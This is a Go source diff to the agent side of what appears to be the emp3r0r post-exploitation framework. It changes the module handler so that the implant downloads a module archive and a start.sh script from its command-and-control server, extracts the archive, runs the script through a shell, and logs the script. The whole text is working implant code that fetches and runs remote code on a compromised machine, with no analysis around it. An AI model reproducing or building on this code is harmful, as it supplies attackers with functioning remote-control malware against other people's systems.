@@ -2,6 +2,7 @@ package agent
 
 import (
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
@@ -14,7 +15,9 @@ import (
 func moduleHandler(modName, checksum string) (out string) {
 	tarball := emp3r0r_data.AgentRoot + "/" + modName + ".tar.bz2"
 	modDir := emp3r0r_data.AgentRoot + "/" + modName
+	start_sh := modDir + "/start.sh"
 
+	// if we have already downloaded the module, dont bother downloading again
 	if tun.SHA256SumFile(tarball) != checksum {
 		_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".tar.bz2",
 			tarball)
@@ -29,7 +32,17 @@ func moduleHandler(modName, checksum string) (out string) {
 		moduleHandler(modName, checksum)
 	}
 
+	// extract files
+	os.RemoveAll(modDir)
 	if err := archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
+		return err.Error()
+	}
+
+	// download start.sh
+	os.RemoveAll(start_sh)
+	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".sh",
+		start_sh)
+	if err != nil {
 		return err.Error()
 	}
 
@@ -44,7 +57,15 @@ func moduleHandler(modName, checksum string) (out string) {
 	}
 	defer os.Chdir(pwd)
 
-	cmd := exec.Command(emp3r0r_data.DefaultShell, modDir+"/start.sh")
+	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)
+
+	// debug
+	shdata, err := ioutil.ReadFile(start_sh)
+	if err != nil {
+		log.Printf("Read %s: %v", start_sh, err)
+	}
+	log.Printf("Running start.sh %s", shdata)
+
 	outbytes, err := cmd.CombinedOutput()
 	if err != nil {
 		out = fmt.Sprintf("Running module: %s: %v", outbytes, err)
